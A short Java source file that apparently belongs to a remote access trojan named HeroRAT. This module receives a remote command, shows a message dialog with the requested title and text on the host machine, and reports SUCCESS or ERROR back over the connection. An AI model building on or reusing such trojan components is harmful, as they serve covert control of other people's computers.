package net.herorat.features.message;

import java.io.DataOutputStream;

import javax.swing.JOptionPane;

import net.herorat.network.Packet;
import net.herorat.network.Packet8Message;


public class Message
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Packet p;
		if (args.length == 4)
		{
			if (show(Integer.parseInt(args[0]), Integer.parseInt(args[1]), args[2], args[3])) p = new Packet8Message(outputstream, new String[] { "SUCCESS" });
			else p = new Packet8Message(outputstream, new String[] { "ERROR" });
			p.write();
		}
		else
		{
			p = new Packet8Message(outputstream, new String[] { "ERROR" });
			p.write();
		}
	}
	
	public static boolean show(int type, int choice, String title, String content)
	{
		JOptionPane.showOptionDialog(null, content, title, choice, type, null, (Object[]) null, (Object) null);
		return true;
	}
}